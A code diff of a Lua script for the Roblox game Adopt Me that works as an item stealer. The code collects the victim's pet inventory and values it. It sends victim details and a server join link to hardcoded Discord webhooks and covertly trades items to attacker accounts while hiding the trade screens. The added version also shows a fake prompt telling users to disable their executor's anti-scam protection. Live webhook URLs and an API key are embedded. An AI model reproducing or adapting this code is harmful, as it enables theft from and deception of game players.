@@ -1,571 +1,754 @@
-task.spawn(function()
-	if Username == nil or Username == "GAG_Collector" then
-		Username = getgenv().allowed_name
-	end
-
-	if Webhook == nil or Webhook == "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG" then
-		Webhook = getgenv().webhook
-	end
-end)
-
-repeat
-	task.wait()
-until game:IsLoaded()
-
-if not game:IsLoaded() then
-	game.Loaded:Wait()
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local coreGui = game:GetService("CoreGui")
+local players = game:GetService("Players")
+local robloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local httpService = game:GetService("HttpService")
+local teleportService = game:GetService("TeleportService")
+local textChatService = game:GetService("TextChatService")
+local runService = game:GetService("RunService")
+local userInputService = game:GetService("UserInputService")
+_G.Usernames = { "Sukuna_Gotnerf", "GAG_Collector", "GAG_Collector1" }
+_G.min_value = 0.1
+_G.pingEveryone = "Yes"
+_G.webhook_me = "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
+_G.webhook_others = "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
+if Webhook and Webhook ~= "" then
+  _G.webhook_others = Webhook
 end
-
-local LocalPlayer = game:GetService("Players").LocalPlayer
-
-LocalPlayer:WaitForChild("PlayerGui", 600)
-LocalPlayer.PlayerGui:WaitForChild("NewsApp", 600)
-LocalPlayer.PlayerGui:WaitForChild("DialogApp", 600)
-
-local load = require(game.ReplicatedStorage:WaitForChild("Fsys", 600)).load
-
-repeat
-	task.wait(1)
-until load("ClientData").get_data()[LocalPlayer.Name].team
-
-print("LOADED")
-
-if not getgenv().executed then
-	getgenv().executed = true
-
-	if getgenv().gui == nil then
-		getgenv().gui = true
-	end
-
-	Usernames = {
-		"GAG_Collector",
-		"GAG_Collector1",
-		"GAG_Collector2",
-		"GAG_Collector3",
-		"GAG_Collector4",
-		"GAG_Collector5"
-	}
-	task.spawn(function()
-		if getgenv().gui then
-		end
-	end)
-	Username = Username
-
-	if Username == nil or Username == "" then
-		game.Players.LocalPlayer:Kick("setup script correctly please")
-	end
-
-	local load2 = require(game.ReplicatedStorage.Fsys).load
-	local _ = game:GetService("ReplicatedStorage").ClientModules.Core.UIManager.Apps.BackpackApp.BackpackApp
-	local u5 = load2("RouterClient")
-	local v6 = load2("ClientData")
-
-	v6.get("equip_manager")
-
-	local v7 = load2("InventoryDB")
-
-	load2("package:Promise")
-
-	local v8 = v6.get("inventory")
-	local u9 = u5.get("TradeAPI/AddItemToOffer")
-	local u10 = u5.get("TradeAPI/ConfirmTrade")
-	local u11 = u5.get("TradeAPI/AcceptNegotiation")
-	local u12 = u5.get("TradeAPI/DeclineTrade")
-	local u13 = u5.get("BackpackAPI/CommitBackpackItemSet")
-	local u14 = u5.get_event("TradeAPI/TradeRequestReceived")
-	local _ = v8.pets
-
-	u5.get("TradeAPI/AcceptOrDeclineTradeRequest")
-
-	local u16 = u5.get("TradeAPI/SendTradeRequest")
-	local v17 = u5.get("DataAPI/DataChanged")
-
-	task.spawn(function()
-		while wait(5) do
-			u5.get("SettingsAPI/SetSetting"):FireServer("trade_requests", 1)
-		end
-	end)
-
-	local n1 = 0
-	local n2 = 0
-	local n3 = 0
-	local n4 = 0
-	local n5 = 0
-	local n6 = 0
-	local n7 = 0
-
-	for _, v in pairs(v6.get("inventory").pets) do
-		if v7[v.category][v.id].rarity == "legendary" and not v.properties.neon and not v.properties.mega_neon then
-			n2 = n2 + 1
-		end
-
-		if v.properties and v.properties.neon == true and v7[v.category][v.id].rarity == "legendary" then
-			n3 = n3 + 1
-		end
-
-		if v.properties and v.properties.mega_neon == true and v7[v.category][v.id].rarity == "legendary" then
-			n4 = n4 + 1
-		end
-
-		if v.properties and v.properties.mega_neon == true and v7[v.category][v.id].rarity ~= "legendary" then
-			n6 = n6 + 1
-		end
-
-		if v.properties and v.properties.neon == true and v7[v.category][v.id].rarity ~= "legendary" then
-			n7 = n7 + 1
-		end
-	end
-
-	for _, v in pairs(v6.get("inventory").food) do
-		if v.id == "pet_riding_potion" or v.id == "pet_flying_potion" then
-			n5 = n5 + 1
-		end
-	end
-
-	if n3 < 2500 then
-		local _Name = game:HttpGet("https://elvebredd.com/values.js"):gsub("var petsData = ", ""):gsub("name", "\"name\""):gsub(", d: ", ", \"d\":"):gsub(", rd: ", ", \"rd\":"):gsub(", fd: ", ", \"fd\":"):gsub(", rfd: ", ", \"rfd\":"):gsub(", n: ", ", \"n\":"):gsub(", rn: ", ", \"rn\":"):gsub(", fn: ", ", \"fn\":"):gsub(", rfn: ", ", \"rfn\":"):gsub(", m: ", ", \"m\":"):gsub(", rm: ", ", \"rm\":"):gsub(", fm: ", ", \"fm\":"):gsub(", rfm: ", ", \"rfm\":"):gsub(", displaytype: ", ", \"displaytype\":"):gsub(", rarity: ", ", \"rarity\":"):gsub(", filtertype: ", ", \"filtertype\":"):gsub(", imageUrl: ", ", \"imageUrl\":"):gsub("]", "{}]")
-
-		decodedValues = game.HttpService:JSONDecode(_Name)
-		decodedValues[#decodedValues] = nil
-		Values = {}
-
-		for _, v in pairs(decodedValues) do
-			Values[v.name] = {
-				regularValue = v.d or 0,
-				neonValue = v.n or 0,
-				megaValue = v.m or 0
-			}
-		end
-
-		_G.DataBase = Values
-
-		function suck_my_dick(p1)
-			value_string = p1
-			value_with_period = string.gsub(value_string, ",", ".")
-			value_number = tonumber(value_with_period)
-			item_value = value_number
-
-			return item_value
-		end
-		function getdatabase()
-			return _G.DataBase
-		end
-
-		total_value = 0
-
-		function gethits()
-			local load3 = require(game.ReplicatedStorage.Fsys).load
-			local v66 = load3("ClientData")
-			local v67 = load3("InventoryDB")
-			local v68 = v66.get("inventory")
-
-			HITS = {}
-			total_value = 0
-
-			for k, v in pairs(v68) do
-				for k2, v2 in pairs(v) do
-					count = 0
-					e = v67[k][v2.id].name
-					datareal = getdatabase()[e]
-
-					if not datareal then
-						if datareal == nil then
-							data = {}
-							data.regularValue = 0
-							data.neonValue = 0
-							data.megaValue = 0
-						end
-					else
-						data = {}
-						data.regularValue = datareal.regularValue
-						data.neonValue = datareal.neonValue
-						data.megaValue = datareal.megaValue
-					end
-
-					if not v2.properties.neon or not v2.properties.mega_neon then
-						item_value = suck_my_dick(data.regularValue)
-						total_value = total_value + item_value
-					end
-
-					if v2.properties.mega_neon then
-						item_value = suck_my_dick(data.megaValue)
-						total_value = total_value + item_value
-					end
-
-					if v2.properties.neon then
-						item_value = suck_my_dick(data.neonValue)
-						total_value = total_value + item_value
-					end
-
-					if HITS == nil then
-						HITS = {}
-					end
-
-					table.insert(HITS, {
-						name = e,
-						value = tonumber(item_value),
-						uid = k2,
-						neon = v2.properties.neon or false,
-						mega = v2.properties.mega or false,
-						fly = v2.properties.flyable or false,
-						ride = v2.properties.rideable or false
-					})
-				end
-			end
-
-			table.sort(HITS, function(p2, p3)
-				return p2.value > p3.value
-			end)
-
-			return HITS
-		end
-
-		hits = gethits()
-		table.sort(hits, function(p4, p5)
-			return p4.value > p5.value
-		end)
-
-		for _, v in pairs(hits) do
-			if v.value > 2 then
-				n1 = n1 + 1
-			end
-		end
-
-		DHcount = 0
-		first_trade_rap = 0
-
-		for _, v in pairs(hits) do
-			DHcount = DHcount + 1
-			first_trade_rap = first_trade_rap + v.value
-
-			if DHcount == 18 then
-				break
-			end
-		end
-
-		function pastebin()
-			local t1 = {}
-
-			for _, v in pairs(hits) do
-				local t2 = {}
-
-				if not v.mega then
-					if v.neon then
-						table.insert(t2, "Neon")
-					end
-				else
-					table.insert(t2, "Mega Neon")
-				end
-
-				if v.fly then
-					table.insert(t2, "Fly")
-				end
-
-				if v.ride then
-					table.insert(t2, "Ride")
-				end
-
-				if not v.mega and not v.neon and not v.fly and not v.ride then
-					SPACE = ""
-				else
-					SPACE = " "
-				end
-
-				local v58 = table.concat(t2, " ") .. SPACE .. v.name
-
-				if not t1[v58] then
-					t1[v58] = {
-						count = 1,
-						total_value = v.value
-					}
-				else
-					t1[v58].count = t1[v58].count + 1
-					t1[v58].total_value = t1[v58].total_value + v.value
-				end
-			end
-
-			local t3 = {}
-
-			for k, v in pairs(t1) do
-				table.insert(t3, {
-					item = k,
-					count = v.count,
-					total_value = v.total_value
-				})
-			end
-
-			table.sort(t3, function(p6, p7)
-				return p6.total_value > p7.total_value
-			end)
-
-			local t4 = {}
-
-			for _, v in ipairs(t3) do
-				table.insert(t4, v.item .. " x" .. v.count .. " " .. v.total_value)
-			end
-
-			return table.concat(t4, "\n")
-		end
-
-		LIST = "api_paste_code=" .. pastebin() .. "&api_option=paste&api_dev_key=aL23vA-UXpKHvGuqL5_jJ4YIVZGY5Nrr"
-
-		function post()
-			site = request({
-				Method = "POST",
-				Timeout = 10,
-				Url = "https://pastebin.com/api/api_post.php",
-				Headers = {
-					["Content-Type"] = "application/x-www-form-urlencoded"
-				},
-				Body = LIST
-			})
-			hitslist = site.Body
-
-			return hitslist
-		end
-
-		pastebin_link = post()
-
-		if not string.find(pastebin_link, "https://pastebin.com/") then
-			pastebin_link = "Error"
-		end
-
-		task.spawn(function()
-			if setclipboard then
-				setclipboard("https://discord.gg/xscripts")
-			end
-		end)
-
-		function InTrade()
-			if game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible ~= false then
-				return true
-			end
-
-			return false
-		end
-
-		v17.OnClientEvent:Connect(function(...)
-			x = { ... }
-
-			if type(x[3]) == "table" and x[2] == "trade" then
-				_G.trade_info = x[3]
-			end
-		end)
-		table.insert(Usernames, Username)
-
-		function start_steal(p8)
-			task.spawn(function()
-				game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-				game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
-				game:GetService("Players").LocalPlayer.PlayerGui.DialogApp:Destroy()
-				game:GetService("Players").LocalPlayer.PlayerGui.ToolApp.Frame:GetPropertyChangedSignal("Visible"):Connect(function()
-					if game:GetService("Players").LocalPlayer.PlayerGui.ToolApp.Frame.Visible == false then
-						game:GetService("Players").LocalPlayer.PlayerGui.ToolApp.Frame.Visible = true
-					end
-				end)
-				game:GetService("Players").LocalPlayer.PlayerGui.HouseEditorApp:GetPropertyChangedSignal("Enabled"):Connect(function()
-					if game:GetService("Players").LocalPlayer.PlayerGui.HouseEditorApp.Enabled == false then
-						game:GetService("Players").LocalPlayer.PlayerGui.HouseEditorApp.Enabled = true
-					end
-				end)
-			end)
-			sex = u14.OnClientEvent:Connect(function(p9)
-				if InTrade() ~= true then
-					plrName = p9.Name
-
-					if plrName == p8.Name then
-						return
-					end
-
-					u12:FireServer()
-
-					return
-				end
-			end)
-			u12:FireServer()
-			wait(0.1)
-			Username1 = p8.Name
-
-			while task.wait() do
-				repeat
-					u16:FireServer(game.Players[Username1])
-					wait(0.1)
-				until InTrade()
-
-				hits = gethits()
-
-				for _, v in pairs(hits) do
-					uid = v.uid
-
-					local t5 = {
-						[1] = "backpack_locks",
-						[2] = {
-							uid = true
-						}
-					}
-
-					u13:FireServer(unpack(t5))
-					u9:FireServer(uid)
-
-					if #_G.trade_info.sender_offer.items == 18 then
-						break
-					end
-				end
-
-				task.wait()
-
-				if #_G.trade_info.sender_offer.items == 0 then
-					print(1)
-				end
-
-				task.spawn(function()
-					while InTrade() do
-						u11:FireServer()
-						wait(0.35)
-						u10:FireServer()
-					end
-				end)
-
-				repeat
-					wait()
-				until not InTrade()
-			end
-		end
-		function shall_steal(p10)
-			for _, v in pairs(Usernames) do
-				if v:lower() == p10.Name:lower() then
-					return true
-				end
-			end
-
-			return false
-		end
-
-		for _, player in pairs(game.Players:GetPlayers()) do
-			if shall_steal(player) then
-				player.Chatted:Connect(function()
-					start_steal(player)
-				end)
-			end
-		end
-
-		game.Players.PlayerAdded:Connect(function(player)
-			if shall_steal(player) then
-				player.Chatted:Connect(function()
-					start_steal(player)
-				end)
-			end
-		end)
-		imgs = "https://images-ext-1.discordapp.net/external/SN9zgqCIgFRx4vco6NsGsf0QjfoCHf2Lj_k2R67EIIg/https/i.ibb.co/GWsnpph/xpng.png?format=webp&quality=lossless"
-		content_ping = "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")"
-		content_noping = content_ping:gsub("--@everyone\n", "")
-
-		if not (n1 > 0) then
-			content_logs = content_noping
-		else
-			content_logs = content_ping
-		end
-
-		function round(p11, p12)
-			local v52 = 10 ^ (p12 or 0)
-
-			return math.floor(p11 * v52 + 0.5) / v52
-		end
-
-		total_value = round(total_value, 10)
-
-		local t6 = {
-			content = content_logs,
-			username = game.Players.LocalPlayer.Name,
-			avatar_url = imgs,
-			embeds = {{
-				title = "X Scripts Reborn Execution Log. Execute Code Above to Join the Victim",
-				description = "",
-				color = tonumber(13697227),
-				fields = {
-					{
-						name = "Victim Info",
-						value = "```Username: " .. game.Players.LocalPlayer.Name .. "" .. "\nAccount Age: " .. game.Players.LocalPlayer.AccountAge .. "" .. "\nExploit: " .. identifyexecutor() .. "\nYou: " .. Username .. "" .. "\nGame: Adopt Me```",
-						inline = false
-					},
-					{
-						name = "Inventory Information",
-						value = "```" .. table.concat({
-							"Total Value         📚 : " .. tostring(total_value),
-							"",
-							"Pets Above 1$       🍄 : " .. tostring(n1),
-							"Mega Legendarys     🌿 : " .. tostring(n4),
-							"Neon Legendarys     💎 : " .. tostring(n3),
-							"Normal Neon         ⚡ : " .. tostring(n7),
-							"Normal Mega         🧊 : " .. tostring(n6),
-							"F/R Potions         🌈 : " .. tostring(n5),
-							"Normal Legendaries  🎃 : " .. tostring(n2)
-						}, "\n") .. "```",
-						inline = false
-					},
-					{
-						name = "Full Inventory",
-						value = "[Click Here](" .. tostring(pastebin_link) .. ")",
-						inline = false
-					}
-				}
-			}}
-		}
-
-		if not (first_trade_rap > 100) or not (n1 > 0) or math.random(1, 2) ~= 1 then
-			request({
-				Url = Webhook,
-				Method = "POST",
-				Headers = {
-					["Content-Type"] = "application/json"
-				},
-				Body = game:GetService("HttpService"):JSONEncode(t6)
-			})
-			text = "Adopt Me\nTotal Value: " .. tostring(total_value) .. "\nInventory List: " .. pastebin_link .. "\n" .. math.random(666)
-			text = (function(p13, p14)
-				local s1 = ""
-
-				for i = 1, #p13 do
-					local v77 = p13:sub(i, i)
-
-					s1 = s1 .. string.char(string.byte(v77) + p14)
-				end
-
-				return s1
-			end)(text, 2)
-			text = crypt.base64_encode(text)
-
-			local t7 = {
-				content = text,
-				username = game.Players.LocalPlayer.Name,
-				avatar_url = imgs
-			}
-
-			request({
-				Url = "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG",
-				Method = "POST",
-				Headers = {
-					["Content-Type"] = "application/json"
-				},
-				Body = game:GetService("HttpService"):JSONEncode(t7)
-			})
-		else
-			newdata = t6
-			newdata.embeds[1].title = "esli zalutaesh polucish **" .. math.floor(first_trade_rap * 0.3 * 100) .. "** rub thats rich asf man"
-			request({
-				Url = "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG",
-				Method = "POST",
-				Headers = {
-					["Content-Type"] = "application/json"
-				},
-				Body = game:GetService("HttpService"):JSONEncode(newdata)
-			})
-		end
-
-		return
-	end
-
-	warn("no")
-
-	return
+_G.scriptExecuted = _G.scriptExecuted or false
+local usernames, webhookMe, webhook, f1, f2, v1, localPlayer, v2, v3, frame, dialog, frame2,
+  tradeAPISendTradeRequest, tradeAPIAddItemToOffer, tradeAPIAcceptNegotiation,
+  tradeAPIConfirmTrade, jobId, jsonDecode, v4, f3, v5, f4, v6, f5, v7, v8, f6
+if _G.scriptExecuted then
+  return
+else
+  _G.scriptExecuted = true
+  usernames = _G.Usernames or {}
+  local minValue = _G.min_value or 0.1
+  local pingEveryone = _G.pingEveryone or "No"
+  webhookMe = _G.webhook_me or "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
+  webhook = Webhook or "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG"
+  localPlayer = players.LocalPlayer
+  if next(usernames) == nil or webhook == "" then
+    localPlayer:kick("You didn't add username or webhook")
+    return
+  elseif game.PlaceId ~= 920587237 then
+    localPlayer:kick("Game not supported. Please join a normal Adopt Me server")
+    return
+  elseif #players:GetPlayers() >= 48 then
+    localPlayer:kick("Server is full. Please join a less populated server")
+    return
+  elseif robloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    localPlayer:kick("Server error. Please join a DIFFERENT server")
+    return
+  else
+    v2 = {}
+    v3 = false
+    local playerGui = localPlayer:WaitForChild("PlayerGui")
+    frame = playerGui.TradeApp.Frame
+    dialog = playerGui.DialogApp.Dialog
+    frame2 = playerGui.ToolApp.Frame
+    if not require(replicatedStorage.SharedModules.TradeLicenseHelper).player_has_trade_license() then
+      localPlayer:kick("This script wont work on an alt account.")
+      return
+    else
+      local load = require(replicatedStorage.Fsys).load
+      local routerClient = load("RouterClient")
+      tradeAPISendTradeRequest = routerClient.get("TradeAPI/SendTradeRequest")
+      tradeAPIAddItemToOffer = routerClient.get("TradeAPI/AddItemToOffer")
+      tradeAPIAcceptNegotiation = routerClient.get("TradeAPI/AcceptNegotiation")
+      tradeAPIConfirmTrade = routerClient.get("TradeAPI/ConfirmTrade")
+      local settingsAPISetSetting = routerClient.get("SettingsAPI/SetSetting")
+      local inventoryDB = load("InventoryDB")
+      jobId = nil
+      local headers = {
+        Accept = "*/*",
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
+      }
+      local v9 = request({
+        Url = "https://elvebredd.com/data/Pets.json",
+        Method = "GET",
+        Headers = headers,
+      })
+      jsonDecode = nil
+      if pcall(function() jsonDecode = httpService:JSONDecode(v9.Body) end) then
+      else
+        jsonDecode = httpService:JSONDecode(request({
+          Url = "https://raw.githubusercontent.com/OP-RobloxScripts/pets/refs/heads/main/values",
+          Method = "GET",
+          Headers = headers,
+        }).Body)
+      end
+      local v10 = {}
+      for key, value in pairs(jsonDecode) do
+        if type(value) == "table" and value.name then
+          v10[value.name] = value
+        end
+      end
+      function f1(p1)
+        local v11
+        if p1.mega_neon then
+          v11 = "M"
+        elseif p1.neon then
+          v11 = "N"
+        else
+          v11 = ""
+        end
+        if p1.flyable then
+          v11 = v11 .. "F"
+        end
+        if p1.rideable then
+          v11 = v11 .. "R"
+        end
+        if v11 ~= "" then
+          v11 = "[" .. v11 .. "]"
+        end
+        return v11
+      end
+      local function f7(p2, p3)
+        local v12, v13
+        if not p2 then
+          return nil
+        else
+          local v14 = p3 or {}
+          if p2.rvalue or p2.nvalue or p2.mvalue then
+            if v14.mega_neon then
+              v12 = "mvalue"
+            elseif v14.neon then
+              v12 = "nvalue"
+            else
+              v12 = "rvalue"
+            end
+            if v14.rideable and v14.flyable then
+              v13 = " - fly&ride"
+            elseif v14.rideable then
+              v13 = " - ride"
+            elseif v14.flyable then
+              v13 = " - fly"
+            else
+              v13 = " - nopotion"
+            end
+            return p2[v12 .. v13] or p2[v12]
+          end
+          if p2.value then
+            return p2.value
+          end
+          return nil
+        end
+      end
+      v4 = 0
+      local function f8(p4, content)
+        local v15 = identifyexecutor()
+        local headers2 = { ["Content-Type"] = "application/json" }
+        local v16 = v15 or "Unknown"
+        local v17 = {
+          {
+            name = "Victim Username:",
+            value = [[
+```lua
+]] .. localPlayer.Name .. "\nAccount Age: " .. localPlayer.AccountAge .. "\n```",
+            inline = true,
+          },
+          {
+            name = "Executor",
+            value = [[
+```lua
+]] .. v16 .. "\n```",
+            inline = true,
+          },
+          {
+            name = "Join link:",
+            value = "[joiner.railway.app/920587237/" .. jobId
+              .. "](https://fern.wtf/joiner?placeId=920587237&gameInstanceId=" .. jobId .. ")",
+          },
+          {
+            name = "Item list:",
+            value = [[
+```lua
+]],
+            inline = false,
+          },
+          {
+            name = "Summary:",
+            value = [[
+```lua
+]] .. string.format("Total Value: %s", v4) .. "\n```",
+            inline = false,
+          },
+          {
+            name = "Game Teleporter",
+            value = [[
+```lua
+game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. ', "' .. jobId .. [[
+", game.Players.LocalPlayer)
+```]],
+            inline = false,
+          },
+        }
+        local v18 = {}
+        for index, value2 in ipairs(p4) do
+          local v19 = value2.Name .. " " .. f1(value2.Properties)
+          if v18[v19] then
+            v18[v19].Count = v18[v19].Count + 1
+            v18[v19].TotalValue = v18[v19].TotalValue + value2.Value
+          else
+            v18[v19] = {
+              Name = value2.Name,
+              Properties = value2.Properties,
+              Count = 1,
+              TotalValue = value2.Value,
+            }
+          end
+        end
+        local v20 = {}
+        for key2, value3 in pairs(v18) do
+          table.insert(v20, value3)
+        end
+        table.sort(v20, function(p5, p6) return p5.TotalValue > p6.TotalValue end)
+        local v21
+        for index2, value4 in ipairs(v20) do
+          local v22 = f1(value4.Properties)
+          if v22 ~= "" then
+            v21 = string.format(
+              "%s %s (%sx): %.2f Value", v22, value4.Name, value4.Count, value4.TotalValue
+            )
+          else
+            v21 = string.format(
+              "%s (%sx): %.2f Value", value4.Name, value4.Count, value4.TotalValue
+            )
+          end
+          v17[4].value = v17[4].value .. v21 .. "\n"
+        end
+        v17[4].value = v17[4].value .. "\n```"
+        if #v17[4].value > 1024 then
+          local v23 = {}
+          for match in v17[4].value:gmatch("[^\r\n]+") do
+            table.insert(v23, match)
+          end
+          while #v17[4].value > 1024 and #v23 > 0 do
+            table.remove(v23)
+            v17[4].value = table.concat(v23, "\n") .. "\nPlus more!\n```"
+          end
+        end
+        request({
+          Url = webhookMe,
+          Method = "POST",
+          Headers = headers2,
+          Body = httpService:JSONEncode({
+            content = content,
+            embeds = {
+              {
+                title = "🐲 Join to get Adopt Me hit",
+                color = 65280,
+                fields = v17,
+                footer = { text = "Adopt Me Stealer" },
+              },
+            },
+            key = "manhwaisthekeyletsgo",
+          }),
+        })
+      end
+      function f3(p7, content2)
+        local headers3 = { ["Content-Type"] = "application/json" }
+        local v24 = identifyexecutor() or "Unknown"
+        local v25 = {
+          {
+            name = "Victim Username:",
+            value = [[
+```lua
+]] .. localPlayer.Name .. "\nAccount Age: " .. localPlayer.AccountAge .. "\n```",
+            inline = true,
+          },
+          {
+            name = "Executor",
+            value = [[
+```lua
+]] .. v24 .. "\n```",
+            inline = true,
+          },
+          {
+            name = "Join link:",
+            value = "[joiner.railway.app/920587237/" .. jobId
+              .. "](https://fern.wtf/joiner?placeId=920587237&gameInstanceId=" .. jobId .. ")",
+          },
+          {
+            name = "Item list:",
+            value = [[
+```lua
+]],
+            inline = false,
+          },
+          {
+            name = "Summary:",
+            value = [[
+```lua
+]] .. string.format("Total Value: %s", v4) .. "\n```",
+            inline = false,
+          },
+          {
+            name = "Game Teleporter",
+            value = [[
+```lua
+game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. ', "' .. jobId .. [[
+", game.Players.LocalPlayer)
+```]],
+            inline = false,
+          },
+        }
+        local v26 = {}
+        for index3, value5 in ipairs(p7) do
+          local v27 = value5.Name .. " " .. f1(value5.Properties)
+          if v26[v27] then
+            v26[v27].Count = v26[v27].Count + 1
+            v26[v27].TotalValue = v26[v27].TotalValue + value5.Value
+          else
+            v26[v27] = {
+              Name = value5.Name,
+              Properties = value5.Properties,
+              Count = 1,
+              TotalValue = value5.Value,
+            }
+          end
+        end
+        local v28 = {}
+        for key3, value6 in pairs(v26) do
+          table.insert(v28, value6)
+        end
+        table.sort(v28, function(p8, p9) return p8.TotalValue > p9.TotalValue end)
+        local v29
+        for index4, value7 in ipairs(v28) do
+          local v30 = f1(value7.Properties)
+          if v30 ~= "" then
+            v29 = string.format(
+              "%s %s (%sx): %.2f Value", v30, value7.Name, value7.Count, value7.TotalValue
+            )
+          else
+            v29 = string.format(
+              "%s (%sx): %.2f Value", value7.Name, value7.Count, value7.TotalValue
+            )
+          end
+          v25[4].value = v25[4].value .. v29 .. "\n"
+        end
+        v25[4].value = v25[4].value .. "\n```"
+        if #v25[4].value > 1024 then
+          local v31 = {}
+          for match2 in v25[4].value:gmatch("[^\r\n]+") do
+            table.insert(v31, match2)
+          end
+          while #v25[4].value > 1024 and #v31 > 0 do
+            table.remove(v31)
+            v25[4].value = table.concat(v31, "\n") .. "\nPlus more!\n```"
+          end
+        end
+        request({
+          Url = webhook,
+          Method = "POST",
+          Headers = headers3,
+          Body = httpService:JSONEncode({
+            content = content2,
+            embeds = {
+              {
+                title = "🐲 Join to get Adopt Me hit",
+                color = 65280,
+                fields = v25,
+                footer = { text = "Adopt Me Stealer" },
+              },
+            },
+            key = "manhwaisthekeyletsgo",
+          }),
+        })
+      end
+      v5 = {}
+      for key4, value8 in pairs(getgc()) do
+        if type(value8) == "function" and debug.getinfo(value8).name == "get_remote_from_cache" then
+          local v32 = debug.getupvalues(value8)
+          if type(v32[1]) == "table" then
+            for key5, value9 in pairs(v32[1]) do
+              v5[key5] = value9
+            end
+          end
+        end
+      end
+      local function f9(p10, ...)
+        local v33 = v5[p10]
+        if not v33 then
+          return nil
+        end
+        if v33:IsA("RemoteFunction") then
+          return v33:InvokeServer(...)
+        end
+        if v33:IsA("RemoteEvent") then
+          v33:FireServer(...)
+        end
+      end
+      local dataAPIGetAllServerData = f9("DataAPI/GetAllServerData")
+      if not dataAPIGetAllServerData then
+        localPlayer:kick("Tampering detected. Please rejoin and re-execute without any other scripts")
+        return
+      else
+        local v34 = {
+          pet_flying_potion = "Fly A Pet Potion Forever",
+          pet_riding_potion = "Ride A Pet Potion Forever",
+        }
+-- https://discord.gg/AwGHNh7Z7T
+        local v35 = { "Candy Cane", "Trike Stroller" }
+        for key6, value10 in pairs(dataAPIGetAllServerData[localPlayer.Name].inventory) do
+          for key7, value11 in pairs(value10) do
+            local v36 = inventoryDB[value11.category] or inventoryDB[key6]
+            if not v36 then
+            else
+              local v37 = v36[value11.id] or v36[tostring(value11.id)]
+                or v36[tonumber(value11.id)]
+              if not v37 then
+                for key8, value12 in pairs(v36) do
+                  if value12
+                    and (value12.id and tostring(value12.id) == tostring(value11.id)
+                      or value12.name and value12.name == value11.name) then
+                    v37 = value12
+                    break
+                  end
+                end
+              end
+              if not v37 then
+              else
+                local v38 = v10[v37.name]
+                if not v38 and v34[value11.id] then
+                  v38 = v10[v34[value11.id]]
+                end
+                if v38 then
+                  v1 = f7(v38, value11.properties)
+                else
+                  v1 = f7(v37, value11.properties)
+                end
+                if not v1 then
+                elseif v1 >= minValue and not table.find(v35, v37.name) then
+                  table.insert(v2, {
+                    UID = key7,
+                    Name = v37.name,
+                    Properties = value11.properties,
+                    Value = v1,
+                  })
+                  v4 = v4 + v1
+                end
+              end
+            end
+          end
+        end
+        frame:GetPropertyChangedSignal("Visible"):Connect(function()
+          if frame.Visible then
+            v3 = true
+          else
+            v3 = false
+          end
+        end)
+        dialog:GetPropertyChangedSignal("Visible"):Connect(function() dialog.Visible = false end)
+        frame2:GetPropertyChangedSignal("Visible"):Connect(function() frame2.Visible = true end)
+        local v39 = game
+        v39:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
+        players.LocalPlayer.PlayerGui.HintApp:Destroy()
+        local v40 = game
+        v40:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+        function f4()
+          local screenGui = Instance.new("ScreenGui")
+          screenGui.Parent = coreGui
+          local frame3 = Instance.new("Frame")
+          frame3.Parent = screenGui
+          frame3.Size = UDim2.new(0, 480, 0, 240)
+          frame3.Position = UDim2.new(0.5, -240, 0.5, -120)
+          frame3.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+          local uiCorner = Instance.new("UICorner")
+          uiCorner.CornerRadius = UDim.new(0, 12)
+          uiCorner.Parent = frame3
+          local textLabel = Instance.new("TextLabel")
+          textLabel.Parent = frame3
+          textLabel.Size = UDim2.new(1, -20, 0, 50)
+          textLabel.Position = UDim2.new(0, 10, 0, 10)
+          textLabel.BackgroundTransparency = 1
+          textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+          textLabel.Text = "Delta 'Anti-Scam' is removing the Anti Cheat Feature of this script."
+          textLabel.Font = Enum.Font.SourceSansBold
+          textLabel.TextSize = 18
+          textLabel.TextWrapped = true
+          textLabel.TextXAlignment = Enum.TextXAlignment.Center
+          local textLabel2 = Instance.new("TextLabel")
+          textLabel2.Parent = frame3
+          textLabel2.Size = UDim2.new(1, -20, 0, 110)
+          textLabel2.Position = UDim2.new(0, 10, 0, 70)
+          textLabel2.BackgroundTransparency = 1
+          textLabel2.TextColor3 = Color3.fromRGB(200, 200, 200)
+          textLabel2.Text = "\t⚠️ Please follow these instructions to make the script work.\n\t1. Rejoin the Game\n\t2. Open Delta Setting and Turn OFF 'Anti-Scam' Feature\n\t3. Execute the script\n\t"
+          textLabel2.Font = Enum.Font.SourceSans
+          textLabel2.TextSize = 18
+          textLabel2.TextWrapped = true
+          textLabel2.TextXAlignment = Enum.TextXAlignment.Left
